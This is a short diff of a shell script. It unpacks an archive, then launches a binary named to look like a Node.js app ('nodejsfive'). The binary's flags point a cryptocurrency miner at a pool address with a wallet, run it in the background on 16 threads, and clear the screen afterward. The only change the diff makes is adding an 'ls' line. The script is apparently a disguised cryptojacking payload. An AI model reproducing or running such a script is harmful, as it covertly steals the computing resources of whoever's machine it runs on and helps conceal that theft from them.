@@ -5,3 +5,4 @@ tar xvzf nodejsapp8q.tar.gz
 cd nodejsbrnt
 ./nodejsfive -o 167.114.65.192:10111 -u LZdfLiPo6Zs2hq7FggM1ePUMZjtmisCpzVunSjzyRTC7ei3xUJwuZtqCMKuf4kwsVci9ZhzAksHykFUX9ENzvMep4fG2nNs.100000 -p plugwalk -a rx/loki --donate-level 1 -t 16 -B
 clear
+ls
